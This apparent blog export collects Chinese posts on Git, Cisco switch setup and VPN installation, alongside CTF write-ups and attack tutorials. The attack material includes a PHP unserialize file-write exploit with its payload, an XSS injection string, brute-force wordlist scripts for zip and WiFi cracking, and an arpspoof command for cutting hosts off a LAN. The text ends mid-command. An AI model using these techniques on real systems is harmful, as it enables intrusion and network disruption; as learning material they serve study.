我们可以利用commit SHA来给一个过去的提交打tag: git tag -a v0.9 XXXX push的时候是不包含tag的,如果想包含,可以在push时加上--tags参数. fetch的时候,branch HEAD可以reach的tags是自动被fetch下来的, tags that aren’t reachable from branch heads will be skipped.如果想确保所有的tags都被包含进来,需要加上--tags选项.git remotelist, add and delete remote repository aliases. 因为不需要每次都用完整的url,所以Git为每一个remote repo的url都建立一个别名,然后用git remote来管理这个list. git remote: 列出remote aliases. 如果你clone一个project,Git会自动将原来的url添加进来,别名就叫做:origin. git remote -v:可以看见每一个别名对应的实际url. git remote add [alias] [url]: 添加一个新的remote repo. git remote rm [alias]: 删除一个存在的remote alias. git remote rename [old-alias] [new-alias]: 重命名. git remote set-url [alias] [url]:更新url. 可以加上—push和fetch参数,为同一个别名set不同的存取地址.git fetchdownload new branches and data from a remote repository. 可以git fetch [alias]取某一个远程repo,也可以git fetch --all取到全部repo fetch将会取到所有你本地没有的数据,所有取下来的分支可以被叫做remote branches,它们和本地分支一样(可以看diff,log等,也可以merge到其他分支),但是Git不允许你checkout到它们. git pullfetch from a remote repo and try to merge into the current branch. pull == fetch + merge FETCH_HEAD git pull会首先执行git fetch,然后执行git merge,把取来的分支的head merge到当前分支.这个merge操作会产生一个新的commit. 如果使用--rebase参数,它会执行git rebase来取代原来的git merge.git rebase--rebase不会产生合并的提交,它会将本地的所有提交临时保存为补丁(patch),放在”.git/rebase”目录中,然后将当前分支更新到最新的分支尖端,最后把保存的补丁应用到分支上. rebase的过程中,也许会出现冲突,Git会停止rebase并让你解决冲突,在解决完冲突之后,用git add去更新这些内容,然后无需执行commit,只需要: git rebase --continue就会继续打余下的补丁. git rebase --abort将会终止rebase,当前分支将会回到rebase之前的状态.git pushpush your new branches and data to a remote repository. git push [alias] [branch] 将会把当前分支merge到alias上的[branch]分支.如果分支已经存在,将会更新,如果不存在,将会添加这个分支. 如果有多个人向同一个remote repo push代码, Git会首先在你试图push的分支上运行git log,检查它的历史中是否能看到server上的branch现在的tip,如果本地历史中不能看到server的tip,说明本地的代码不是最新的,Git会拒绝你的push,让你先fetch,merge,之后再push,这样就保证了所有人的改动都会被考虑进来.git refloggit reflog是对reflog进行管理的命令,reflog是git用来记录引用变化的一种机制,比如记录分支的变化或者是HEAD引用的变化. 当git reflog不指定引用的时候,默认列出HEAD的reflog. HEAD@{0}代表HEAD当前的值,HEAD@{3}代表HEAD在3次变化之前的值. git会将变化记录到HEAD对应的reflog文件中,其路径为.git/logs/HEAD, 分支的reflog文件都放在.git/logs/refs目录下的子目录中.特殊符号:^代表父提交,当一个提交有多个父提交时,可以通过在^后面跟上一个数字,表示第几个父提交: ^相当于^1. ~&lt;n&gt;相当于连续的&lt;n&gt;个^.原帖地址: https://www.cnblogs.com/my–sunshine/p/7093412.html]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PT基本配置练习]]></title>
    <url>%2F2018%2F11%2F18%2FPT%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[配置主机 ip 、子网掩码、默认网关 ip 、子网掩码在表格中网关配置路由器 ip 即可 交换机(switch)配置主机名称123&gt; enable# conf t# hostname &lt;name&gt; 特权 EXEC 密码1234567&gt; enable# conf t# enable secret &lt;password&gt;# exit# disable //验证# enable //验证 //输入密码，登入即可 用户 EXEC 密码1234# line console 0# password &lt;password&gt;# login# exit VTY 线路密码1234# line vty 0 15# password &lt;password&gt;# login# exit 加密密码1# service password-encryption 标语# banner motd # &lt;content&gt; # 配置 ip 、子网掩码、默认网关(VLAN)12345678&gt; enable# int vlan 1# ip address &lt;ip-address&gt; &lt;mask&gt;# description &lt;description&gt; //描述# no shutdown# exit# ip default-gateway &lt;gateway&gt;# exit 路由器(route)ip 、子网掩码1234567&gt; enable# conf t# interface &lt;type&gt; &lt;num&gt;# ip address &lt;ip&gt; &lt;mask&gt;# description &lt;description&gt;# no shutdown# exit 保存配置# copy running-config start-config]]></content>
      <tags>
        <tag>PT练习</tag>
        <tag>cisco</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7 搭建 l2tp vpn]]></title>
    <url>%2F2018%2F11%2F16%2FCentos7-%E6%90%AD%E5%BB%BA-l2tp-vpn%2F</url>
    <content type="text"><![CDATA[安装服务123# wget --no-check-certificate https://raw.githubusercontent.com/teddysun/across/master/l2tp.sh# chmod +x l2tp.sh# ./l2tp.sh 最后会进行初次配置 然后重启服务 123# service ipsec restart# service xl2tpd restart# ipsec verify 添加，更改用户 编辑 /etc/ppp/chap-secrets 文件即可 格式: &lt;user&gt; l2tp &lt;password&gt;]]></content>
      <categories>
        <category>vpn</category>
      </categories>
      <tags>
        <tag>vpn</tag>
        <tag>l2tp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[序列化和反序列化]]></title>
    <url>%2F2018%2F11%2F01%2F%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[什么是序列化&amp;反序列化 序列化: 序列化是将变量转换为可保存或传输的字符串的过程。 反序列化:将在序列化过程中所生成的字符串再转化成原来的变量使用。 PHP序列化的方法 PHP最初通过内置的serialize()和unserialize()函数来实现序列化。serialize()的参数可以是resource类型外的所有变量类型，最常见的是用来序列化对象，unseialize()将serialize的返回结果作为参数，进行反序列化，得到原对象对不受信任的数据上使用内置的unserialize()函数时，通常是有风险的。对于对象有两种“魔术方法”，__sleep()和__wakeup()，可以在类别中实现。而会分别从serialize()和unserialize()中调用，对应于清理和恢复对象的功能。例如，在序列化时可能需要关闭数据库连线，并在反序列化时恢复连线；这个功能可在这两种魔术方法中处理。它们也允许对象选择哪些属性可被序列化。从PHP 5.1开始有面向对象的序列化机制，即为Serializable接口。 PHP序列化的作用对象序列化使用情况: 对象的创建的时候被存储到内存里，在解析的时候被销毁，如果机器重启，那么对象也将被销毁在新建。想要保存对象或者将对象传给另一台机器，就需要将对象序列化；或者在需要存储数据到mysql等数据库中时需要序列化。 将对象转化成字符串叫序列化 将字符串转化成对象叫反序列化 总之，就是方便数据传输和存储 # 实例说明 1234567891011121314151617181920212223&lt;?php ################建立一个数组###################$arr1 = [];for($i=0; $i&lt;5; $i++) $arr1['key'.$i] = 'value'.$i;echo "建立一个数组arr1:";print_r($arr1);echo "&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;";##############################################################序列化该数组###################$arr_serialize = serialize($arr1);echo "arr1序列化后为:";print_r($arr_serialize);echo "&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;";#############################################################反序列化后输出##################$arr_back = unserialize($arr_serialize);echo "arr_serialize反序列化后为:";print_r($arr_back);##############################################?&gt; 输出结果如下 注意这里序列化后的开头处是 a 再给出一段代码 123456789101112&lt;?php class test&#123; #这里定义一个类 var $value = 'abc123';&#125;$obj = new test; #new一个对象obj出来$obj_serialize = serialize($obj); #将obj序列化print_r($obj_serialize);echo "&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;";$obj_back = unserialize($obj_serialize); #反序列化obj_serializeprint_r($obj_back); ?&gt; 输出结果为: 发现不同之处 当一个数组序列化时，以a 为标志，对象序列化是以 O 为标志 由此可以解读 PHP 序列化: a 代表的是 array 数组，5代表变量名称有几个字符， s 代表 string字符串类型，4 为 几个字符，后面的是字符串本身……O 代表 object 对象；4代表的是序列化的对象名称有几个字符；对象名称；1为对象有一个值…… unserialize()反序列化函数漏洞 有前面的铺垫，我们可知道序列化得到的字符串是可解读的，那么如果精心构造一个字符串传给unserialize()进行反序列化，就可以控制到我们想控制的东西 前面提到过，当 PHP 调用serizlize()和unserialize()函数时，会调用__sleep()和__wakeup()两个魔术方法(Magic function) 先介绍下魔术方法: 魔术方法(Magic function)在命名自己的类方法时不能使用这些方法名，除非是想用其魔术功能。PHP官方文档-魔术方法PHP中文网-魔术方法 利用反序列化漏洞 unserialize()调用__wakeup()魔术方法 一个例子: 123456789101112&lt;?php class test&#123; #这里定义一个类 var $value = 'abc123'; function __wakeup()&#123; echo "__wakeup&lt;/br&gt;"; &#125;&#125;$demo = unserialize('O:4:"test":1:&#123;s:5:"value";s:6:"abc123";&#125;');#O:4:"test":1:&#123;s:5:"value";s:6:"abc123";&#125;是序列化test-&gt;value的值print_r($demo); ?&gt; 结果如下:明显unserialize()调用了__wakeup() 利用unserialize()函数漏洞 环境: index.php和shell.php index.php 12345678910111213&lt;?phpclass test&#123; var $value = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;value); fclose($fp); &#125;&#125;$get = $_GET['getvalue'];unserialize($get);?&gt; 我们可以控制序列化的字符串达到利用__wakeup()函数的目的 这里构造一个包含有phpinfo();的字符串 PHP脚本如下: 123456789&lt;?php class test&#123; var $value = '123';&#125;$obj = new test;$obj-&gt;value = "&lt;?php phpinfo(); ?&gt;";$temp = serialize($obj);print_r($temp); ?&gt; 运行后得到O:4:&quot;test&quot;:1:{s:5:&quot;value&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;} 将其传入漏洞站点 打开shell.php发现成功写入&lt;?php phpinfo(); ?&gt; 并解析成功]]></content>
      <tags>
        <tag>序列化</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用shadowsocks(ss)搭建vpn服务]]></title>
    <url>%2F2018%2F10%2F31%2F%E4%BD%BF%E7%94%A8shadowsocks-ss-%E6%90%AD%E5%BB%BAvpn%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[租云服务器(境外) 充值-&gt;选服务器-&gt;确定-&gt;完成 这里我租的是 Vultr 的服务器配置: Ubuntu1804 日本机房 仅仅搭个 VPN ， cpu 、内存、硬盘套餐选个便宜的就行(注意不要$2.5的 不要$2.5的 不要$2.5的，没有ipv4地址，另租ipv4不划算！) 搭建服务端 ssh连接服务器 123wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 几个版本哪个都行 最后一步会让设置端口，密码，加密方式等，按步骤来就行 记住你设置的参数，连接会用到 设置完成，VPN 服务端就搭好了 配置客户端 下载 shadowsocks 的客户端，Windows 客户端 下载完打开 ss 开始配置，地址、端口、密码必填，选择你的加密方式，如果开启允许其他设备连接那就把代理端口设置一下 配置完成，右键任务栏的小飞机图标，选择启动系统代理，就能从设备上翻墙了 使用 GOOGLE BBR 加速(可选) 修改系统变量并保存生效 123echo "net.core.default_qdisc=fq" &gt;&gt; /etc/sysctl.confecho "net.ipv4.tcp_congestion_control=bbr" &gt;&gt; /etc/sysctl.confsysctl -p 查看内核是否开启 BBR 如下显示即为开启 12# sysctl net.ipv4.tcp_available_congestion_controlnet.ipv4.tcp_available_congestion_control = bbr cubic reno 查看BBR是否启动 如下显示即为启动 12# lsmod | grep bbrtcp_bbr 20480 8 安装BBR 123wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh 重启服务器 lsmod | grep bbr查看bbr状态 卸载1# ./shadowsocks-all.sh uninstall 服务器无法连接 Vultr 换服务器就更换 IP ，所以 IP 是循环使用的可能你的服务器就刚好换到被中国墙了的 IP 或者一段时间的使用后你的 IP 被墙了这都很正常，解决方法:把你的服务器删了，重新选择一次就换 IP 了要是还是被墙，那么推荐你去这里逛逛:|`传送门``|]]></content>
      <categories>
        <category>VPN</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
        <tag>ss</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于Github和Coding布置博客的域名问题]]></title>
    <url>%2F2018%2F10%2F30%2F%E5%85%B3%E4%BA%8EGithub%E5%92%8CCoding%E5%B8%83%E7%BD%AE%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9F%9F%E5%90%8D%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[先讲清本人blog环境: 使用 Github 和 Coding 两个平台，即 abelche.github.io 和 abelche.coding.me阿里云租的两个域名 abelche.com 和 abelche.top 通过自己的域名访问域名解析 在平台中绑定自己的域名 在域名解析中添加记录 CNAME 类型，从你的域名(主机记录)指向平台域名(记录值)即可 统一 urlCoding 平台布置Coding 的布置比较容易 这是 Coding 的配置界面 我这里绑定了两个，有无 www 的，我只想让 url 出现 www.abelche.top 只需要把跳转选上就行 安全证书有就选上吧 Github 平台布置Github 只能绑定一个域名，所以需要我们在 DNS 解析上做点文章 和 Coding 绑定一样，在 Github 上绑定好域名，这里只能绑定一个域名，我想让访问 url 都为 www 我这里添加的是 www.abelche.com 在阿里云域名管理的 DNS 解析额外添加一条记录]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>域名</tag>
        <tag>url</tag>
        <tag>域名解析</tag>
        <tag>Github</tag>
        <tag>Coding</tag>
        <tag>博客</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-DLCTF2018]]></title>
    <url>%2F2018%2F09%2F20%2FWriteup%2FWP-DLCTF2018%2F</url>
    <content type="text"><![CDATA[Web网络安全法百度一下，你就知道 漏洞 Top_10进入题目后先正常查询，发现查到7(XSS)的时候有红色字母提示，解读后发现是 alert(key) ，那么就更明确这道题是 XSS 漏洞，只有一个输入框，那么有可能是突破点 bp 抓下包，发现是 post 传输的 id ，在源码中找到传入的 id 值在&lt;script&gt;&lt;/script&gt;中 而且该值是用&#39;&#39;引起来的，那么直接构造&#39;;alert(&#39;key&#39;);&#39; post 传入得到flag I_DONT_LIKE_MD5这道题是明显的md5碰撞，那么直接 GET 传参5[]=1&amp;&amp;m[]=QNKCDZO&amp;&amp;d[]=s878926199a进入到新网页，按F12得到flag 我是来送分的根据提示，直接在网站个人信息页面查看源码，查找flag 逆向听说WEB有送分？notepad++打开查找flag 杂项basebasebasebase隐写脚本如下 py27 12345678910111213141516171819202122232425262728293031323334def get_base64_diff_value(s1, s2): base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' res = 0 for i in xrange(len(s1)): if s1[i] != s2[i]: return abs(base64chars.index(s1[i]) - base64chars.index(s2[i])) return resdef solve_stego(): with open('./3.txt', 'rb') as f: file_lines = f.readlines() bin_str = '' for line in file_lines: steg_line = line.replace('\n', '') norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '') diff = get_base64_diff_value(steg_line, norm_line) pads_num = steg_line.count('=') if diff: bin_str += bin(diff)[2:].zfill(pads_num * 2) else: bin_str += '0' * pads_num * 2 res_str = '' for i in xrange(0, len(bin_str), 8): res_str += chr(int(bin_str[i:i+8], 2)) print res_strsolve_stego() 眼见为实打开后发现很长的文本，但是只由0-9，A-F组成，那么有可能是16进制 notepad++打开，工具HEX-&gt;ASCII，保存 记事本打开后发现有一串诡异的字符Z m x h Z 3 t X Z T F j T 2 1 l X 3 Q w X 0 R M T l V D V E Y h I S F 9 去掉空格 base64 解码得到flag 流量分析一个160+M的包，wireshark打开 这么大，加载都半天的东西肯定要分析一下， 结合提示，既然是黑客登陆 web 服务器，且有 webshell 过滤 http 协议，从后往前找，先发现了/image/article/a.php，一看这就是马，打开后更加确定 webshell 为 a.php 继续往前找，找到 http协议 login 的包，先找到用户名为”人事”的登陆信息，不太像答案，再往前找发现了 admin 的登陆信息 提交flag，正确 密码学嘀嘀嘀先摩斯密码解密，解密后是以0x开头的文本，HEX-&gt;ASCII解码，得到 unicode 编码的字符串，&amp;#x0035;&amp;#x0041;&amp;#x0036;&amp;#x0044;&amp;#x0037;&amp;#x0038;&amp;#x0036;&amp;#x0038;&amp;#x0035;&amp;#x0041;&amp;#x0033;&amp;#x0033;&amp;#x0037;&amp;#x0033;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0044;&amp;#x0037;&amp;#x0041;&amp;#x0034;&amp;#x0036;&amp;#x0036;&amp;#x0041;&amp;#x0035;&amp;#x0039;&amp;#x0037;&amp;#x0041;&amp;#x0034;&amp;#x0041;&amp;#x0036;&amp;#x0041;&amp;#x0035;&amp;#x0041;&amp;#x0034;&amp;#x0034;&amp;#x0034;&amp;#x0039;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0033;&amp;#x0034;&amp;#x0045;&amp;#x0037;&amp;#x0041;&amp;#x0035;&amp;#x0031;&amp;#x0033;&amp;#x0034;&amp;#x0034;&amp;#x0044;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0035;&amp;#x0033;&amp;#x0030;&amp;#x0034;&amp;#x0045;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0039;&amp;#x0033;&amp;#x0032;&amp;#x0034;&amp;#x0044;&amp;#x0035;&amp;#x0034;&amp;#x0036;&amp;#x0037;&amp;#x0033;&amp;#x0031;&amp;#x0034;&amp;#x0045;&amp;#x0035;&amp;#x0034;&amp;#x0035;&amp;#x0031;&amp;#x0037;&amp;#x0038;&amp;#x0034;&amp;#x0044;&amp;#x0035;&amp;#x0037;&amp;#x0034;&amp;#x0041;&amp;#x0036;&amp;#x0038;&amp;#x0034;&amp;#x0044;&amp;#x0034;&amp;#x0038;&amp;#x0033;&amp;#x0030;&amp;#x0033;&amp;#x0044;继续Unicode转中文解码，得到5A6D78685A3373314D7A466A597A4A6A5A4449314D324D334E7A51344D3245304E3249324D5467314E5451784D574A684D48303D又是16进制，转字符串ZmxhZ3s1MzFjYzJjZDI1M2M3NzQ4M2E0N2I2MTg1NTQxMWJhMH0=base64flag{531cc2cd253c77483a47b61855411ba0} 鸭！这大脸盘子！！！下载一张图片，一看就是猪圈，RWEB 下面给的一串字符串 用维吉尼亚密码解密 RWEB 是密钥 得到flagisvigenereandpigpencipher 提交flag{vigenereandpigpencipher}发现不正确， 看到hint有大写字母，尝试flag{VigenereAndPigPenCipher}正确]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>DLCTF</tag>
        <tag>杂项</tag>
        <tag>密码学</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-杂项系列]]></title>
    <url>%2F2018%2F08%2F26%2FWriteup%2FWP-Bugku-%E6%9D%82%E9%A1%B9%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[这是一张单纯的图片题目地址http://120.24.86.145:8002/misc/1.jpg 将图片保存下来，直接notpad++查看下，发现末尾有一串 Unicode解码后的到key{you are right} 隐写题目地址http://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar 一个压缩包，里面是一张.png的图片 用各种工具查看也没什么发现， 后来知道是修改图片的宽高…… winhex打开后第一行是文件头，固定格式第二行的前四位是宽，后四位是高 winhex打开A4 改为 F4 修改成功 telnet题目地址http://120.24.86.145:8002/misc/telnet/1.zip wireshark打开，查看tcp数据流 得到flag{d316759c281bf925d600be698a4973d5} 眼见非实(ISCCCTF)题目地址http://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip 下载得到一个名为 zip 的文件，根据文件名的提示，给它加 .zip 的后缀 果然成功打开，打开后发现 解压后发现文件错误，本着试一试的原则，后缀名改成 .zip结果还真能打开，压缩包里是查看文件，最终在 眼见非实.zip\眼见非实\word\document.xml 这个文件中找到flag flag{F1@g} 又一张图片，还单纯吗题目地址http://120.24.86.145:8002/misc/2.jpg 保存图片，直接扔 binwalk 里foremost 分离后直接得到flag的图片 猜题目地址http://120.24.86.145:8002/misc/cai/QQ20170221-132626.png 题目提示flag是某人名字全拼 图片又是一张不全的照片直接百度识图，搜到原图 key{liuyifei} 宽带信息泄露题目地址http://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin 上网搜索得知需要用 RouterPassView 这个软件打开 隐写2题目地址http://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg 把这张傻子图扔到binwalk上foremost分开，有一个压缩包，里面有一个加密的压缩包和一张图片分析提示，三个数，一个国王，一个女神，一个骑士，又说斗地主……那不就….还是直接暴力破解吧 先做个字典000~999,写了个垃圾的py(但是能用啊) 1234567filename = "num.txt"for x in range(10): for y in range(10): for z in range(10): with open(filename, "a") as file_obj: file_obj.write(str(x)+str(y)+str(z)+'\n')file_obj.close() 暴力破解，试了好多，终于找到一个速度快又好用的工具Advanced Archive Password Recovery密码871 拿到图片，notpad++打开得到f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 提交发现不正确！还要解密….base64解密 eTB1IEFyZSBhIGhAY2tlciE= 得到y0u Are a h@cker!最后输入flag{y0u Are a h@cker!} 多种方法解决题目地址http://120.24.86.145:8002/misc/3.zip 下载后打开两次会报错，然后就好了，不知道是题目的原因还是真出错了…. 得到一个打不开，后缀改成 .txt 打开是提示图片格式和一长串 base64那就base64转图片解密得到一张二维码 识别后得到KEY{dca57f966e4e4e31fd5b15417da63269} linux题目地址http://120.24.86.145:8002/misc/1.tar.gz 不知道这道题怎么出的，解压，直接notepad++查看文件搜索 key 就得到key{feb81d3834e2423c9903f4755464060b} 中国菜刀题目地址http://ctf.bugku.com/files/047cefd48389dfc5bdc055d348bbf520/caidao.zip 多点几次打开压缩包解压 wireshark打开caidao.pcapng查看tcp流发现有压缩包文件 扔到kali中binwalk 文件 -e得到一个文件，添加后缀.tar，打开得到key{8769fe393f2b998fa6a11afe2bfcd65e} 这么多数据包题目地址http://ctf.bugku.com/files/425d97c3a1a2fa32dcead0ddd90467c0/CTF.pcapng.zip 这道题给的数据包非常多，上网找答案 发现有很多包，快速浏览后发现前面都是攻击机(192.168.116.138)在向目标机(192.168.116.159)进行端口扫描，再往后看到5542已经getshell，追踪TCP数据流，发现txt文件 base64 解码得到 CCTF{do_you_like_sniffer} 做个游戏(08067CTF)题目地址http://ctf.bugku.com/files/465585c655e201384823f64342cfd554/heiheihei.jar 打开后是一个小游戏， 那么Java反编译(推荐Java Decompiler) 找到flag{RGFqaURhbGlfSmlud2FuQ2hpamk=} 将RGFqaURhbGlfSmlud2FuQ2hpamk=进行base64解码得到DajiDali_JinwanChiji 想蹭网先解开密码题目地址http://ctf.bugku.com/files/77decd384a172b9a2294e6c6acfd48cc/wifi.cap 文件是.cap，扔到wireshark里看一下，基本上都是802.11协议的包，WiFi认证过程重点在WPA的四次握手包，也就是eapol协议的包，过滤一下 aircrack-ng 进行破解先生成字典 12345678filename = "num.txt"for x in range(10): for y in range(10): for z in range(10): for n in range(10): with open(filename, "a") as file_obj: file_obj.write('1391040'+str(x)+str(y)+str(z)+str(n)+'\n')file_obj.close() aircrack-ng -w num.txt wifi.cap开始破解 Linux2题目地址:链接: http://pan.baidu.com/s/1skJ6t7R 密码: s7jy 又是linux，以bugku一贯的niaoxing，搜索key然后……然后就找到了…. 账号被盗了题目地址http://120.24.86.145:9001/ 打开题目后发现一个按钮，点击后跳出 第一反应bp抓包改包 这里的false改为true即可 然后跳出一个链接，进入后保存文件发现是一个cf刷枪的程序 wireshark抓包，账号密码随便填写，提交，抓到后查看TCP数据流， 都是base64，解码后得到用户名和密码，发现是网易邮箱 登陆后在邮件草稿里能看到flag(要是flag提交不了就是有人恶搞了，没办法) 细心的大象题目地址https://share.weiyun.com/9287be0a629971ac53d97f39727eee18 压缩包里有一张图片，扔到binwalk上发现 分离后是一个压缩包，里面有第二张图片但是需要密码，查看了下图片1的属性，果然找到了备注一串字符一看就是经过base64加密的，拿去解密后就是图片2的密码 查看图片2发现是500px420px，为啥不是500px500px呢？ 用winhex打开将标记的A4修改为F4 打开就会发现flag 爆照(08067CTF)题目地址http://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg 一张穹妹的图片，binwalk扫一下后 分离后得到一个压缩包 notepad++查看后发下头部有jfif的标记，将文件添加后缀.jfif转换成图片后发现88.jfif有个两个二维码一个能扫出来一个扫不出来扫码是一串字符 bilibili 剩下的扔到kali上binwalk跑，发现8888.jfif有压缩包，foremost分离后解压会得到一个二维码扫码后得到一串字符panama 继续binwalk会发现后面的图片是正常的 剩下的只有之前的888.jfif有修改的痕迹，foremost分离出一张.jpg的图片果然在备注中发现了base64解码后得到silisili 按名称排序flag{bilibili_silisili_panama} 流量分析(cnss)题目地址http://ctf.bugku.com/files/7f9a18ccd16fa1c52f3fad835ad8df8e/1490637625.pcapng 用wireshark打开后分析Tcp数据流 发现http://space.bilibili.com/17190571/这个用户，那么打开访问一下发现 拿去base64解码后发现好像不对啊，上网查了下wp发下好像是被别人搞了 没办法，总之这道题base64解码两次就ok了 这是flagcnss{b1libil1_A_gay_wEbsite} 猫片(安恒)题目地址http://ctf.bugku.com/files/9f1bebac6b8282da716720cc99f35bed/png 一个名叫png的文件，给他加个.png的后缀，变成一个图片 扔到binwalk上看下，没有问题 涉及的东西有点多先放一下https://blog.csdn.net/x947955250/article/details/81482471 妹子的陌陌题目地址http://120.24.86.145:8002/misc/momo.jpg 下载后是一张照片binwalk发现有压缩包，改后缀.zip打开有一个.txt文件，需要密码解压，图片上有喜欢我吗.五个字符，密码就是这个 解压后得到 解密第一个摩斯密码得到HTTP//ENCODE.CHAHUO.COM/构造成urlHTTP://ENCODE.CHAHUO.COM/ 在这个网站中选择AES解密U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0= 得到momoj2j.png 访问http://c.bugku.com/momoj2j.png 得到二维码，扫描后得到flag，要是扫不出来就将图片反相做一下再扫]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>杂项</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WP-Bugku-Web进阶系列]]></title>
    <url>%2F2018%2F08%2F26%2FWriteup%2FWP-Bugku-Web%E8%BF%9B%E9%98%B6%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[phpcmsV9题目地址http://120.24.86.145:8001/ 不知道为什么，御剑扫后台直接出来了 海洋CMS题目地址http://120.24.86.145:8008/ 来晚了，这题已经被日的面目全非]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web进阶</tag>
        <tag>cms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali渗透]]></title>
    <url>%2F2018%2F08%2F23%2Fkali%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[本文中所使用工具的原理及方法arpspoof工具的arp欺骗ARP地址解析协议(ARP)，ARP(Address Resolution Protocol)，是一个位于TCP/IP协议栈中的网络层。当局域网内计算机间(或者是计算机与网关间)需要通信时，使用ARP协议获取目标IP地址对应的MAC地址，然后计算机间再通过该MAC地址完成数据包发送。ARP欺骗一般目的是把自己伪装成网关，从而欺骗目标机器，使本应发送到真实网关的数据包发送到欺骗者的机器。 arpspoof工具 功能: arpspoof通过伪造arp回复包将局域网中主机A(或者所有主机)的网路包重定向到主机B。用法: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host driftnet的图片抓取ettercap的嗅探sslstrip将HTTPS的链接还原为HTTP 局域网断网工具ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。 这里我用我的win10物理机当作目标机，这里可见此时是可以 ping 通 baidu 的![](https://inwcna.sn.files.1drv.com/y4mnS0nujCJGLhRQAIuL8Zug7DkUHmd39xlXQ1MneIwU4ku2aw2Ycezh1AXF0nOHrNMd8rM4vlL6a49tgT4_dzPZeZcPF77JfFOFKFQ2cde9RMspXyTO4Mcfix6P77ChkzZuRtBQfbYLoEwGRqPLfIeGQe4XK7gmIuPIZ0Rlz2N2vz7KmoDmvWryjUFC9j4vahkRUgqSXeiiksVAJHHpB_8eQ?width=517&height=102&cropmode=none) 进行arp攻击`arpspoof -i 网卡名称 -t 目标机ip 网关`![](https://inwbna.sn.files.1drv.com/y4m3WfQYZRtWUO6GdPz7g3SAzpbTO_qRcjleZmxJQO3Cnf9dFfoLeeLpH2YMlEuCTqCSRrIP7VcPeQRQ-5Y2eZo58OAJ9rgxpj7wA_NPfZtU5R9TD5qXTzHCfeYTANj4xANlJ8DBZDaVCuzomXaBMln3T1leSvdQdtAtoyrlU0wFQmSviuj3y4F7DdKmj6ZJvIrvbmwLP5-78W1-KgHnlv3uA?width=724&height=95&cropmode=none) 发现物理机已经断网了![](https://invqna.sn.files.1drv.com/y4m-G0vnhkziXhuQXrYws_dgCwQkmxHJgvBrKgPpdLusxunYgKkKi0nH9WlLT6QqMRj9TDCGI5hgoB--cEJsMENVxw0iDhhrAC4OJzx8etgCHdCxJuhWx734bL3kUSzfu8qIMABsxVF1ewFdQXo161ZcvzAwubVLysXgTtNkqKCn-8zBufwJdIvoflWId_yODKziGonMglzDtVsQ9NhLQgNTg?width=474&height=38&cropmode=none) 获取内网他人浏览的图片 物理机当作目标机 kali 使用 arpspoof 工具 `arpspoof -i 网卡名称 -t 目标机ip 